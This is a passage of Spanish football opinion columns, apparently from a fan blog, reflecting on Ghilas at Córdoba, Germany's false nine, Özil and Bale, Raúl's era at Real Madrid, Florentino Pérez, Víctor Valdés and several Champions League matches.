nos dijo Galder. Pero lo olimos como quien mete la nariz en el puchero de una abuela. Seguía lloviendo, nos hicimos una foto a pie de campo, asomando con timidez las bufandas del Córdoba, María llamó a su hermano, Galder me daba la sincera enhorabuena por la victoria, le prometimos una camiseta blanquiverde para su hijo mayor; nos volvimos a abrazar María y yo como si hubiéramos ganado la Champions y salimos del estadio a celebrar una victoria que de tan esperada, de tan sufrida, se había convertido en única. Brindamos por Ghilas y por su gol. Si hubiera tenido a Roy Batty delante en ese instante le hubiera dicho: “No, por más que insistas; este momento no se perderá en el tiempo como lágrimas en la lluvia”. Después la historia conocida. Lo prosaico ganará a lo épico: Ghilas se abandonó, bebió, fue castigado, dejo de interesarse por el equipo que le había traído a España, despreció a la afición que le había dado su corazón con un lacito, el Córdoba bajó a Segunda, el argelino hizo las maletas y desapareció de nuestras vidas para siempre. Nos dejó ese gol como memoria de su paso por el equipo blanquiverde. Un gol que no vale nada. Que no sirvió para nada, que no echó raíces en el futuro. Que fue sólo un momento de felicidad en el vacío inmenso.Cuando vi que Ghilas jugaría en el Levante durante esta temporada, quise odiarlo. Después sentí envidia por el Levante, que se lleva un delantero increíble. Intermitente, indisciplinado, pero con un talento incuestionable para el fútbol. Parece más gordo y cansado. No un cansancio físico, es algo por dentro. Uno de esos jugadores que nunca encuentran un hogar, que jamás deshacen las maletas. Un futbolista que asume que su trabajo es vagar de vestuario en vestuario, de ciudad en ciudad. “¿Cómo te sientes al estar sin hogar? , como un completo desconocido, como un canto rodado” que diría Dylan.Fue titular en el primer partido del Levante contra el Celta. Noventa minutos y una derrota en casa. No será una temporada fácil en el equipo granota, aunque con el Córdoba se debió vacunar de años difíciles. Aún no se ha desvinculado del Oporto, su futuro es insondable. De momento intenta hacer lo único que sabe: marcar goles. Quiero tenerle rencor a Ghilas, pero no puedo. Escribo de él y lo hago con el mejor de los deseos. Ojalá muchas de sus galopadas acaben en gol, como aquella tarde lluviosa en Bilbao. Ojalá haga felices a los del Levante como nos hizo a los del Córdoba. Durante un puñado de partidos fue el delantero que siempre había soñado para mi equipo. Los aficionados somos un poco idiotas. Al final lo perdonamos todo, nos quedamos con lo mejor, como los amores juveniles a los que siempre queremos volver por pura estupidez. Al pesar de todo, y como canta Ben Harper, Ghilas “tiene diamantes en su interior, él es sólo un ladrón generoso”. Le pido a María que pregunte por las oficinas de su trabajo cómo se dice “falso nueve” en alemán. Creo que quedaba pintón como título del artículo. Como es ella, a los veinte minutos tenía la respuesta en mi correo: Hängende Spitze. Le digo que gracias, que es para una cosa de DdF y, aunque no la veo, intuyo que pone esa cara del tipo “con qué clase de loco me he ido yo a juntar”. Pongo el término en Google y encuentro una entrada en Wikipedia, en alemán obviamente. Os copio literalmente y si saltáis de nombre propio en nombre propio entenderéis de qué va el rollo: “Der österreichische Spieler Matthias Sindelar war in den 1930ern vielleicht die erste falsche Neun. Nach dem Krieg war der Ungar Nándor Hidegkuti, der in der legendären ungarischen goldenen Elf spielte, einer bekanntesten Vertreter dieser Rolle. Der AS Rom unter Luciano Spalletti spielte mit in einer “4–6–0-Aufstellung” und Francesco Totti füllte diese Rolle aus; Auch der FC Arsenal unter Arsène Wenger benutzte diese Spielidee und setzte Robin van Persie in dieser Rolle ein.Während der Europameisterschaft 2012, setzte Trainer Vicente del Bosque, der wahlweise mit einer “4–6–0-Aufstellung” spielen ließ, Cesc Fabregas als falsche Neun ein. Auch die Trainer des FC Barcelona Pep Guardiola und Tito Vilanova setzten Lionel Messi als falsche Neun ein”. Hoy juega Alemania contra Portugal y se confirma lo que ya sospechábamos cuando vimos la lista definitiva de Joachim Low para el Mundial: Alemania irá sin delantero centro puro. Está Klose, pero más parece reservado como revulsivo cazagoles cuando las cosas vayan mal dadas que como apuesta titular. Alemania, con Gerard Müller, Rummenigge, Klinsmann o Rudi Völler en su memoria, parece apuntarse al falso nueve; ese “invento” que nos chirrió de primeras cuando Del Bosque colocó a Cesc arriba en la pasada Eurocopa y que tan buen resultado nos brindó. Ayer el diario Bild adelantó la alineación que hoy ocupará el césped. Yo casi no me la creo. Me falta Özil, con dudas pero indiscutible en un partido como éste. Lo que se apunta arriba si me parece más razonable: Schürrle, Müller y Podolski. Si bien la decisión de Del Bosque era más opinable, teniendo en cuenta que Torres, Negredo, Llorente, Villa o incluso Soldado podrían haber ocupado el ataque; con Alemania da la sensación de que el sistema se ajusta a la necesidad y no al revés. No queda otra cosa que hacer cuando a Mario Gómez no se le esperaba, a Klose ya se le está acabando la gasolina y lo que viene por detrás aún está verde para estas citas.Joachim Low dice que lo  mismo da falso nueve, verdadero nueve o qué sé yo.Entiende -en su fútbol de asociación bien asentado y de eficacia probada como los detergentes- que con tanto talento en la zona tangencial al área poco importa quién tire a puerta. Portugal es a priori el rival más difícil del grupo. A minutos de que den las alineaciones me gusta la apuesta roma de Low, esa flecha sin punta igualmente certera. Es valiente, coherente con la plantilla y está cargada de peligro. Da miedo la asociación arriba, el despliegue técnico bien custodiado por un centro del campo de garantías. El juego entre líneas, que es al fútbol lo que el Lambrusco es al sexo: un posibilitador puro. Veremos si Klose está en el once, insisto, yo no lo veo. En cualquier caso, peregrina preocupación debe ser para un equipo al que ni la baja de Reus le ha conmovido la soberanía. El falso nueve, aquello de lo que nos reíamos hace dos años, es hoy una de las armas más peligrosas de Alemania, una Selección que casi como siempre, parece seria candidata al título. No soy periodista. Eso significa que, cuando me venga en gana, me puedo dejar llevar por criterios subjetivos, caprichosos y tangenciales cuando escribo aquí. Soy un afortunado, lo sé. Recuerdo un partido del Mundial se Sudáfrica. Era un encuentro de Alemania contra alguien. Miro en Google. Alemania-Serbia. El único partido que perdió el equipo de Low, a parte de la semifinal contra España. El equipo de Antic, ni lo recordaba, venía de perder contra Ghana y Alemania de golear a Australia. Fue un partido algo tosco que no sé por qué vi. Al lío. Hubo una jugada en la que le eché la cruz a un jugador. En una disputa de balón, en medio del arreón germano para empatar un partido que se preveía importante viendo lo que estaba sucediendo en el grupo, Özil quitó la pierna descaradamente. Me indigné, vete tú a saber por qué. Pensé en un equipo de barrio. Si eso lo hubiera hecho alguien de mi equipo, lo hubiera fulminado a lo Cíclope de X-Men. Su actitud me pareció irresponsable, cobarde y poco propia de un jugador de primer nivel. Quitó la pierna, tal cual, se apartó, el rival no entraba sucio, simplemente forcejeaban. Y Özil se apartó, se fue, le faltó despedirse. Había visto algo así pocas veces en un campo de fútbol. A Özil lo había disfrutado con cuenta gotas en el Werder Bremen y me había gustado su juego desaliñado y decisivo. Los jugadores diferentes siempre ablandan al aficionado. Pero ese día, en esa jugada, vi que Özil jamás llegaría a nada.Como veis, y por méritos propios, yo no me gano la vida con el fútbol. A veces me dejo llevar por las primeras impresiones. También me pasa con las mujeres y así me va.Cuando vi que el Madrid fichó a Özil tras el Mundial, no pude quitarme la imagen de esa porfía que Mesut se ahorró. La realidad fue algo distinta. Fue clave en el sistema de Mourinho, se hizo valer en el Bernabéu y dejó algunas jugadas para ver en Youtube una y otra vez. Özil fue para los jugadores del Madrid como ese tio que va poco a casa pero cuando lo hace siempre es cargado de regalos. A veces desaparecía, se perdía en sudor y exigencia, pero cuando estaba, cuando encontraba su rinconcito en el campo, todo pasaba por él. Este verano, cuando en las horas postreras del Mercado, Arsenal y Madrid confirmaron su venta, una parte del madridismo entró en combustión. Y ni siquiera la imagen de Bale logró apagar el fuego.Con datos ya en la mano, es decir, con unas cuantas jornadas disputadas tanto en Liga como en Champions, la comparación vuelve a estar de moda. Ayer, en ese entretenidísimo termómetro de la demagogia que es Twitter, leí mucho sobre el alemán y el galés. Hay varios hechos que no negaré: el juego del Madrid ha perdido con la marcha de Özil. Bale no está jugando y cuando lo ha hecho ha sido intrascendente. El Arsenal está desarrollando un juego preciosista –al fin- y efectivo y la gente que sabe de esto dice que el alemán es parte fundamental del éxito -momentáneo- del club gunner. Al Madrid le falta una pieza que haga mover el engranaje y ni Modric, ni Illarra ni Isco parecen de momento esa pieza.Y ahora viene mi reflexión. En fútbol los resultados siempre están después de la planificación. Con Özil el año pasado no se ganó nada. Este año Florentino, que es a los presidentes lo que Lady Gaga es a la música, ha vuelto a las andadas de los galácticos. Es decir, ficho al mejor y que el entrenador se rebane el cerebro para acoparlo en el sistema. Bale me parece mejor jugador que Özil, diferente jugador, pero mejor si miramos los stats como en un juego de videoconsola. Me gusta el fichaje de Bale, en general. Me ilusiona, creo que es un jugador que puede llegar a niveles de Crisitano -quién puede dudar del portugués ahora-. Y entiendo que esto es un negocio y el dinero no crece de los árboles. Se vendió a Özil para pagar a Bale. No me entra otra cosa en la cabeza. ¿Era la mejor opción? Posiblemente. Un jugador muy valorado con recambios ya en la plantilla. Vender a Benzema implicaba fichar a un delantero centro –lo comido por lo servido-. ¿Vender a Di María? Puede ser, pero no hubieran sacado ni la mitad de lo que pagó el equipo de Wenger por Özil. La jugada es obvia. El resultado es impredecible.Qué nos queda. Esperar. Si esto fuera un tanteo de tenis el Madrid habría perdido el primer set por 6-0. Özil es un jugador inmenso que está jugando con la inmensidad deseada en su nuevo equipo. Todo funciona en Londres y casi nada funciona en Madrid. ¿Podrá Bale hacer olvidar a Özil? Es una posibilidad. Ancelotti tiene la clave, espero. Yo celebré el “trueque”. Özil nunca fue santo de mi devoción, pero por motivos ajenos al fútbol, por ese tipo de cosas que uno no sabe pero que están ahí. El partido de ayer frente al Nápoles me hizo dudar de este artículo. Es lo bueno de no ser periodista, que puedo hablar menos de fútbol y más de alrededores. La prensa deportiva, el poder mediático, tertulias deportivas donde sólo se grita, donde tener razón es lo menos importante. Portadas que pretenden desestabilizar un club, campañas siniestras, conspiraciones, ego desenfrenado, acusaciones larvadas, videomontajes. El periodismo deportivo en España no es sano, es demasiado importante, está ahí arriba en algún lugar como un Gran Hermano que nos vigila, que nos tiene ojeriza, que pretende administrar las cosas con arreglo a sus espúrios fines, con arreglo a una moral carcomida por el poder. Y digo yo, rompamos los grilletes, prescindamos de todos ellos, no volvamos a bajar al quiosco, apartemos sus pasquines de la barra cuando tomamos el café, apaguemos las radios, quememos la TDT… recuperemos Goles son Amores, recuperemos la lentejuela, las mamachicho, la canción ligera, el vaquero ceñido, la música enlatada, este folkie tan nuestro.Al fin y al cabo, si esto es sólo un deporte, why so serious? “La misma noche que hace blanquear los mismos árboles / Nosotros, los de entonces, ya no somos los mismos”, Pablo NerudaTodo acaba. Desde una inabordable tristeza hasta la más ingenua de las felicidades. El tiempo no es un juez, porque no tiene criterio ni razones para su crueldad. El tiempo es una guillotina que no descansa nunca, que no se queda atascada; impía y salvaje en su labor diaria. Es terrible pensar en lo que ya no tenemos o en lo que fuimos. Viejos prematuros, de repente, sólo con echar un vistazo atrás. Garabatos en un cuaderno escolar, sudaderas de nuestros grupos preferidos raídas por el uso, libros llenos de polvo que jamás volveremos a abrir, juegos de la Play 1 metidos en un cajón, posters con las esquinas arrugadas, una camiseta del Madrid que ya no nos entra.Siento una ridícula amargura cuando pienso en mi madridismo. Soy del Madrid desde niño. Sin motivo alguno, como deben ser estas cosas. Los colores de tu equipo se erigen de la nada, racionalizar el sentimiento es demasiado británico para mi gusto. En el barrio cada uno era de quien era. Un puñado del Barcelona, otro puñado del Madrid, y cuatro locos del Atlético. Después estaba el Córdoba, que era como una camiseta interior calada de Abanderado. Estar estaba, pero para algunos sólo sobresalía un poco a la altura del pecho.Cuando Raúl debutó el 29 de octubre de 1994 supe que no me había equivocado de equipo. Hasta entonces siempre había dudado de si debí de elegir la acera azulgrana en lugar del pálido blanco que vestía. Cuando el Barça ganó a la Sampdoria, cuando veía los goles de Stoichkov, cuando los de Cruyff goleaban con la camiseta de Meyba… cuánto sufrimiento para un niño. Pero ese día, contra el Zaragoza, algo se endureció de repente. Raúl tenía tres años más que yo. Había sentado a Butragueño, ídolo párvulo que a estas alturas me resultaba insoportable, y casi bate a Cedrún; un portero grandón al que por aquella época admiraba.Desde ahí todo fueron alegrías. Mi madridismo se hizo fuerte en el Instituto, después con los amigos, viendo los partidos de Champions en el bar Puerto Rico, llevando camiseta Kelme en las pachangas de domingo, los cabezazos de Zamorano, la volea de Zidane, Casillas cortándose las mangas de la camiseta, las faltas de Roberto Carlos, la bendita intermitencia de Guti, los goles de Morientes, la contención de Redondo, Ronaldo Nazario contra el Manchester, Xabi Alonso, Figo, Mijatovic, Ramos… y Raúl. Siempre Raúl llevando el timón de un equipo que ganara o perdiera raro era que no me emocionara. No es nostalgia, es otra cosa. Quizá el mismo fútbol con diferente vestido.Estuviera bien o estuviera mal el equipo, desde octubre de 1994 a julio de 2010, mi madridismo fue una fortaleza.Ya sé que los clubes van más allá de los jugadores. Eso dije cuando se fue Raúl. Los futbolistas se van, los clubes permanecen. Teníamos a Cristiano Ronaldo, uno de los mejores jugadores de la historia. Un goleador. Un nuevo líder. Qué íbamos a saber entonces dónde acabaría todo esto. Hablo como un viejo. De esos de ´cualquier tiempo pasado fue mejor´. De los que no entienden quiénes son esos señores tatuados y repeinados que patean ahora los balones que en su tiempo pateaban prístinos caballeros, rudos, elegantes y serviciales a su club.Anoche, mientras veía en Canal+ un reportaje sobre Raúl y sus veinte años de fútbol en la élite, mis compañeros de Diarios de Fútbol whatsapeaban en el grupo que compartimos acerca de la película de Cristiano Ronaldo recién estrenada. Mientras veía a Raúl con esos viejos chándales de algodón, con las botas negras, los petos de Teka, los entrenadores con americana ancha y mullet; ellos hablaban de coches deportivos, abdominales y egolatría.Ni Raúl era un héroe ejemplar ni Cristiano Ronaldo es un villano de película. Ni el fútbol es sencillez, ni me ha dado un ataque de nostalgia. Sólo pensé en el Real Madrid. En el cambio de paradigma. En el reportaje hablaban Valdano, Hierro, Del Bosque… venían a hablar de los valores del Madrid, de la cantera, de abrirse paso a fuerza de fútbol. Butragueño hablaba de la generosidad de los veteranos, Álvaro Benito de la felicidad que era entrenar con los mayores. Todo me pareció sencillo, accesible, deportivo, sano. Entendí lo que supuso Raúl. Yo tenía catorce años, historias como esa te hacen creer en un deporte que más allá del dinero es carbón para la máquina del ánimo. Hoy en la cantera está Odegaard, que entrena con el primer equipo por contrato.Cristiano Ronaldo fue expulsado contra el Córdoba en el Arcángel. El equipo blanquiverde hizo un buen partido, pese a acabar derrotado, y el futbolista portugués perdió los papeles. Al salir hizo un gesto que rompió algo dentro de mi madridismo. El Córdoba estaba al borde del descenso, en la temporada más triste de su historia, descabezado, solo en la cola de la clasificación, frustrado. Era un equipo herido, tumbado en la vaguada esperando que el sol y los buitres lo ajusticiaran. El Córdoba era mi equipo. Como también lo era el Madrid desde pequeño. Aquella tarde se enfrentaban dos partes de mí: quizá una más infantil que la otra, quizá una injustamente tratada, quizá una lacerante contradicción, pero eso es lo de menos. Esa tarde, cuando el colegiado Hernández Hernández sacó la roja a Cristiano y le obligó a abandonar el rectángulo de hierba, el delantero, dirigiéndose a la grada que le pitaba, hizo el gesto de limpiarse la insignia de campeones del mundo de clubes que el Real Madrid tenía en la camiseta.No creo que uno pueda renunciar a sus colores. El Madrid siempre será parte un corazón compartido. También de mi recuerdo, de mi vida, de mis primeros balonazos. Pero ya no siento como antes. No eres tú, Madrid, soy yo. Recuerdo cuando María me llamó desde el Estadio da Luz de Lisboa tras el gol de Ramos. Y luego al acabar el partido.Esa sensación de felicidad, una Copa de Europa tras tanto tiempo. Y pensé en Raúl. Pensé en el Madrid que conocía. El de las otras Copas de Europa, la del 1998, la del 2000, la del 2002. 18, 20, 22 años tenía yo en el sofá de casa, pidiéndole a mi padre que me dejara ver el fútbol, ´de verdad, papa, que este es un partido importante´. Ni Cristiano Ronaldo puede acabar con el madridismo, ni Raúl puede salvarlo. Pero el tiempo te alía con unos y con otros. Sé qué quiero para mi vida, y desde luego no son coches de lujo, películas egomaniacas, ni reivindicaciones vocingleras ante la multitud. El fútbol es mucho más que los goles, que los records y que los títulos. El fútbol es mucho más que el propio fútbol. Por ejemplo, un jugador enclenque que aparece de repente para cambiar para siempre la historia de un club.Daría cualquier cosa por sentir al Real Madrid como lo sentía cuando Raúl perseguía a los rivales. De ver un Oviedo-Real Madrid con los nervios de quien ve una final de Champions. Era otra época, quizá porque era otro Antonio. Alguien diferente, ni mejor ni peor; porque el tiempo es una guillotina que no necesita explicarse. Hace años que encontré mi sitio buscando casi clandestinamente la forma de ver un Córdoba-Albacete en un bar. En la antítesis del mundo. Quizá la grieta que separaba a Raúl del Córdoba -o de cualquier otro equipo local sin títulos ni trascendencia internacional- no era tanta. Quizá en ambos mundos estaba la humildad, el esfuerzo, cierta magnética cercanía. Lo que tengo claro es que hay un abismo entre el Real Madrid que representa Cristiano Ronaldo y cualquier equipo sensatamente pequeño como el mío. Y si tengo que cerrar, cierro: suerte al Madrid porque con él siempre irá una parte de lo que fui, pero no de lo que soy. “Porque sí” se convirtió en un argumento habitual de mi madre cuando la situación en mi casa familiar se convirtió en algo irrespirable. Hay una edad en la que uno quiere salir del hogar, cuando chocan dos mundos autónomos y diferentes, un enfrentamiento generacional que no puede debatirse porque, por más argumentos que como hijo puedas tener, siempre tendrás que asumir que es tu madre quien te parió y jamás te tratará como a un igual, sino como una consecuencia de sí misma. El “porque sí” me irritaba, era un insulto a un chico de 25 años con el que se podía dialogar. Contradecir los dictados maternos era una temeridad. Cuestionar el poder era abrir la caja de los truenos. “Que no se te olvide que soy tu madre” para acallar cualquier rebelión. Ni las pequeñas alianzas con mi hermana servían para hacer temblar los pilares de la tiranía. Cuando una madre se acantona, se encapsula en su autoridad doméstica, ya no hay nada que hacer y lo mejor es rendirse y buscar un nuevo hogar, libre de sus mandatos tiernos pero firmes, familiares pero despóticos. Y así fue como harto de tirar flechitas al castillo matriarcal, decidí rendirme y volar.Ayer viendo a Florentino Pérez pensé en mi madre. En una madre. En el dueño del cortijo que quiere lo mejor para la familia, pero sin la familia. Como un Luis XIV en zapatillas de paño. Rescindir a Ancelotti tiene mucho que ver con ese “porque sí” con el que acaban las conversaciones familiares. El Madrid necesita un nuevo impulso que, por lo visto, no puede dar el italiano. Sólo sabemos que ese arreón lo dará “un entrenador que hable español”, porque así lo expuso Florentino en su insondable argumentario futbolístico. En contra de la plantilla, de los socios, en su deriva fantasmal –doce entrenadores ya a sus espaldas-, en sus indescifrables criterios.Imagino a Florentino Pérez sentado en el sofá de mi casa. Donde me crié.Completamente solo en una larga tarde. Apurando un café ya frío. Con el brasero bajo la mesa camilla. Pensando en qué es lo mejor para sus hijos. En hacer obras en el cuarto de baño. En cómo ahorrar un poco más gastando un poco menos. En esas cosas de jefe de familia que ha perdido la confianza en los demás, que ya no necesita más opinión que la que su cerebro dicta. En un tiempo marcado por las encuestas, la previsión, los análisis empresariales; él sólo aporta su intuición. Como un gran emprendedor que crece de la nada, como una madre que viene de vueltas de todo. Que encuentra lo que nosotros no encontramos, que nos mira fijamente a los ojos y sabe si nuestro corazón está roto o si hemos suspendido un nuevo examen.El Real Madrid es un club caníbal. Tiene cosas del kaiju japonés. Irracional y destructivo. Que no sabe donde pisa, que no sabe lo que come. Jugadores, entrenadores, aficionados, sponsors, títulos.Simplemente avanza hacia un final que nunca llega. Este año, tras la esperadísima Décima, un nuevo año de zozobra, de dudas, de pitos en casa, fichajes incomprensibles, decisiones mediatizadas. Cuando Florentino carga contra los medios de comunicación está pidiendo a gritos que lo dejen solo, que le dejen pensar, deshacer a su gusto. Que en su casa manda él. Como una madre que no quiere que nadie meta la nariz en sus asuntos. Que de las puertas para dentro ella sabrá cómo manejar el cotarro. Que nadie conoce a sus hijos como ella los conoce.A estas alturas de la historia, no sé qué necesita el Madrid. Si la mano dura de Mourinho, o la mano blanda de Ancelotti. Si la disciplina de Benítez o Emery, o la desvergüenza de Klopp. No sé si hay que cambiar de portero, o vender a Cristiano y Bale, si buscar un nuevo modelo de equipo –más solidario, con menos fogonazos- o seguir abonado al talento de las estrellas. Me pierdo en esta maraña presidencialista. No sé si Keylor vino por buen portero o por abrir vías empresariales en Costa Rica, no sé si Lucas Silva es una promesa del fútbol o sólo un activo económico. Si Özil y Di María se vendieron por sus pies o por sus corazones. No sé qué peso tiene el socio en un club globalizado, ni qué periodistas son amanuenses o cuales críticos. A lo Sócrates, ya sólo sé que no sé nada. Lo que está claro es que Florentino echa a sus hijos de casa a la mínima. Que no se casa con nadie. No hay sitio en el Madrid para Wenger o Ferguson, a los que veo como esos hijos treintañeros de ropa planchada y mesa puesta. “That project is my baby”, que se dice en inglés. Y una madre es una madre. “Hala Madrid y nada más” escribió Ancelotti ayer en su despedida. El “nada más” hace referencia a Florentino, especulo. El hogar blanco pese a la despótica madre. A la que nadie entiende ya. El futuro solo está en su cabeza. El resto de piezas se agitan dentro. La reina del ajedrez pasando como un obús al lado de los peones. Como a él le gusta. Todo para el Madrid pero sin el Madrid. Al fin y al cabo es “su” casa, es “su” dinero, son “sus” futbolistas. Se sienta en la mesa camilla del Bernabéu y le da vueltas a la cabeza mientras ve el Sálvame. Las cosas son así, porque sí. Y como dicen las madres: “cuando ya no esté, te darás cuenta de lo que querías a tu madre”. No hay nada más antinatural, siniestro y retorcido que querer ser portero de fútbol. Abandonarse, alejarse del equipo, decidir vivir como un eremita bajo la choza oscura del área. Algo no está bien en tu cabeza si cambias el gol por el no-gol, si prefieres observar desde lejos, vistiendo diferente, como la pelota recorre el césped en las zonas alegres del campo. Decidir ser portero es estar fuera de la lógica del fútbol. Todos los porteros son excéntricos, unos más y otros menos, pero todos están –etimológicamente- lejos del eje que da sentido a este deporte. También pasa que cuando juegan niños al pelotón y hay uno que no lo hace, que se separa del resto, no podemos evitar acercamos a darle cariño. Y quizá eso busca saliéndose del meollo, apartándose con gesto serio y mirando dramáticamente el suelo. Que espera que alguien se le acerque y le diga “¿Cómo estás? ¿Qué te pasa?” y buscar el amor preciso y la atención egoísta. Pasa siempre en el fútbol como en la vida.Valdés es, claro, ese niño. Con su carta de ayer, con la negativa a despedirse con el resto de la plantilla, repetía el mismo ritual que cuando empezó a jugar al fútbol. Se alejaba del resto para que todos le preguntáramos a él.Está bien así. Se merece algo más que una palmada el mejor portero que ha tenido el Barcelona, el más regular, el más laureado. También uno de los más criticados, cuestionados por una afición que viendo desfilar a Bonano, Rüstu, Busquets o Angoy tenía el valor suficiente para pitar a un guardameta que supo adaptarse a un juego tan peligroso como exitoso a la larga, tan delicado como preciso.Valdés es el paradigma del portero moderno. Ya no es el juego con los pies, es la seguridad por alto, atajar balones y no despejarlos, el juego adelantado. Es un portero expuesto, vendido, un portero líbero con más campo que cubrir que sus propios defensas. Arquitectónicamente, el pilar donde reposa la mitad de su equipo. Y a eso se llega, con eso no se nace, porque ser portero es poco más que parar balones. Es volar. Llegar con la palma a los palos saltando desde el estatismo del centro de la línea de gol. Es despejar de puños en los saques de esquina y colocar la barrera higiénicamente. Pero el aprendizaje de Valdés, específico, a la medida de una idea futbolística, es mucho más que eso. Y fue el mejor alumno de la clase. Un modelo que a buen seguro se enseñará en las academias.Se ha ido como es él, corajudo e infantil. De otra forma no habría llegado donde llegó en el equipo que le vio nacer como portero. No sé que le espera en el futuro. Quizá defensas más retrasadas, campos más plácidos, menos tensión, más disfrute. Volar más y correr menos. Tocar el travesaño de vez en cuando. Estar de mejor humor, quién sabe. Es enorme el hueco que deja en el Barça. Pasa también en el fútbol como en el amor que uno no sabe lo que tiene hasta que no lo pierde. Pasa siempre, como decía, en el fútbol como en la vida. Finalmente ningún equipo español ha logrado ganar en estos partidos de ida de octavos. El Sevilla, la última esperanza para lograr una victoria sanadora tras un gris comienzo, empató a uno contra el CSKA de Moscú en un partido aburrido y sin ataque. Un gol de Negredo a pase de Navas en el primer tiempo y un zurdazo inapelable de Mark González en el segundo, que también se coló en la portería rival,  fueron lo único reseñable en un encuentro marcado por el frío y la precaución. Todo se decidirá en el Sánchez Pizjuan, con el recuerdo vivo de aquel partido contra el Fenerbahce que, con todo a favor como ahora, les apeó de los cuartos tras los penaltis. En el otro partido jugado ayer el Inter ganó por la mínima (2-1) a un valiente Chelsea. Los de Ancelotti dibujaron un equipo ofensivo para evitar la verticalidad de los de Mourinho. Kalou, Drogba y Anelka en ataque, y Malouda en el lateral izquierdo sirvieron para atenazar a los locales. Sin embargo un gol decisivo de Cambiasso en el minuto 55, cuando más abierto estaba el partido, acabó con la esperanza blue de llevarse la victoria a Londres. Es difícil entender el mundo a través de las portadas de la prensa deportiva. La realidad y esas enormes fotos con titulares epatantes parecen seguir itinerarios diferentes. A través de ellas nos sentimos en una montaña rusa anímica.Del vacío al milagro y de la conjura a la dimisión. No hay términos medios, ni afición más ciclotímica que la que se aferra a la primera página de un periódico especializado en fútbol. Las cosas del Bernabéu siguen como siempre. Muchos pensábamos que si el Madrid no podía vencer, igualado a puntos, al Barça en su propia casa no merecía ganar el campeonato. Lo tuvo tan a tiro, tan evidente, que las uniones de vestuario y las promesas de victorias futuras y su consecuente fanfarria lejos de animar a la afición produjo una profunda e inevitable depresión. Es comprensible la desconfianza hacia un equipo irregular, masacrado por un ambiente irracionalmente tenso, que naufragó en Copa, en Champions y que tras el 0-2 parecía haberse borrado de la Liga. Lo de que el fútbol da muchas vueltas suena a tópico, pero es difícil titular la jornada de una manera diferente. Tras el empate a nada del Barcelona frente al Espanyol y la victoria del Real Madrid frente al Valencia la cabeza de la competición se adelgaza de nuevo.A lo mejor es impropio hablar de milagro. Todo entra dentro de la lógica deportiva. Las derrotas, aún dolorosas, son sólo lucro cesante. Tres puntos no sumados. Los rivales salen al campo y a veces arañan la cara del líder. El equipo blanco está a un solo punto del Barça. Ayer hizo un magnífico partido ante el tercer clasificado. Calculadora en mano, cualquier cosa es posible. Sumado a que el equipo culé se juega la Champions en un mes, no es descabellado pensar que un final de campaña exitoso del Madrid puede darle el campeonato. Hasta ahí el proceso lógico de un torneo como éste. Hay varios síntomas que nos alejan de la fantasmada, de la conjura mediática. El Madrid parece un equipo firme, en las declaraciones de Pellegrini no hay sombra de boutade, parece ciertamente que el bloque cree en esta reducida hazaña.Ya destacó el técnico chileno que el Madrid ha demostrado pundonor esta temporada. Alzó la cabeza cuando cayó humillantemente ante el Alcorcón, lo hizo cuando cayó inesperadamente ante el Lyon y lo está volviendo a hacer tras la siempre venenosa derrota contra su antagonista catalán. Además los jugadores menos habituales están volviendo a engrasar al equipo. Gago es indiscutible, Guti lleva tres partidos seguidos jugando de titular, Marcelo ha logrado destacar y poco a poco va entrando Benzema. Si a lo dicho sumamos que Cristiano e Higuaín no dan muestras de desfallecimiento y que la defensa sigue rindiendo a un nivel excelente, pensar en ganar todo lo que queda no es disparatado.Las portadas ridiculizan las derrotas y subliman las victorias. No sirven para análisis en profundidad sino que funcionan como píldoras que arengan a la masa o la predisponen de cara a un debate. Si intentamos desmarcarnos de esos boletines de la nadería podemos convencernos de que la Liga tiene 38 jornadas, que no es más que un sumatorio de puntos, y que el Madrid, pese a haber perdido los dos duelos directos con el líder, aún tiene posibilidades ciertas de alcanzar el liderato. La labor del cuerpo técnico es para alabar, primeros o segundos habrán logrado un record de puntos en nuestro campeonato doméstico. Las cosas se están haciendo bien y ni el recuerdo malintencionado del dinero invertido, ni los gestos apáticos del entrenador, ni unas portadas lacerantes podrán cerrar al Real Madrid esta pequeña puerta a la esperanza. Pasa también en el amor que nunca sabemos lo qué queremos. Cuando encontramos la estabilidad y el calor del hogar echamos de menos las aventuras etílicas de los sábados. Y, por el contrario, cuando volvemos borrachos y solos a casa deseamos una pareja a la que amar y con la que sentar la cabeza. Es humana esa contradicción y hasta cierto punto exasperante si la aplicamos al fútbol.Anoche ganó el Barcelona meritoriamente.Le marcó dos goles a domicilio a un equipo candidato a todo este año. No sólo eso. El City de Pellegrini cambió su esquema para frenar el juego eléctrico del club azulgrana. Colocó un doble lateral en la izquierda, sacó de la cueva a Demichelis por su perfil defensivo y comedido, juntó a Fernandinho y Touré unos pasos más atrás de donde suelen jugar y asumió que Negredo era una isla en mitad de un mar hostil y embravecido de aguas celestes.El Barcelona hizo su juego, el que a Martino le gusta. Alejó la pelota de su portería y fijo su campamento en esa zona privilegiada del campo que se extiende entre el círculo central y el arco del área rival. Busquets, Xavi, Cesc e Iniesta dieron sentido al juego del equipo y buscaron la finalización de Messi –así vino el penalti- y de Alexis –más perdido que de costumbre y lejos de sus mejores partidos en Liga-. Visto el partido de anoche no se me ocurre un mejor resultado para el equipo catalán. Con muy poco se consiguió casi una eliminatoria. Tras el penalti y la expulsión de Demichelis – ¿cuándo analizará en profundidad la FIFA este “non bis in idem”? - Pellegrini fue valiente y quiso ir a por el empate. Y casi lo consigue de no ser por un Víctor Valdés inexpugnable partido a partido. El gol de Alves acabó con la paciencia el míster.Decía al principio lo del amor porque me sorprende ver a tanto seguidor azulgrana dudando de este proyecto. Ayer Martino jugó a lo que quería jugar, evitó las crecidas del rival y se fue con un resultado espléndido. Es tragicómico que a un equipo solvente, ganador y competitivo como este se le censure el pragmatismo con el que a veces –y sólo a veces- afronta los partidos. Son los mismos que criticaban la posesión sin goles los que ahora critican los goles sin estética. No se puede ir al mercado vestido de smoking pero tampoco se puede ir a la boda de tu hermana en chándal. En ese término medio está la flexibilidad de tu equipo, su resistencia al juego rival. El Barcelona viene de jugar a un fútbol fuera del propio fútbol con Guardiola. Un modelo académico, perdurable y canónico que pasará a la historia de este deporte. Pero ya pasó esa historia y no podemos hacer como que aún sigue ahí, no podemos hacer como Norman Bates con su madre.El proyecto de Martino sirve, entre otras cosas, para sacar de quicio a un equipo sólido y millonario como el que ayer capitaneaba Pellegrini. El chileno fue el gran perdedor del partido y no la poca vistosidad blaugrana. El penalti es discutible, tengo la sensación de que la falta fue fuera del área y que Demichelis –con el portero saliendo a tiempo- se precipitó en la entrada. Al City le faltó posicionarse en el campo y los centrocampistas se hundieron demasiado, se echaron tan atrás que a veces forcejeaban con su propios defensas. Esa acumulación no estaba ordenada –no era natural ni estaba 